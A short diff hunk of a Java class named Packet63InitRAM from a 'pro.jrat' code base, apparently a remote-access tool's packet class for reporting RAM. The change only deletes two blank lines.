@@ -4,8 +4,6 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
-
 public class Packet63InitRAM extends AbstractOutgoingPacket {
 
 	private int mbRam;
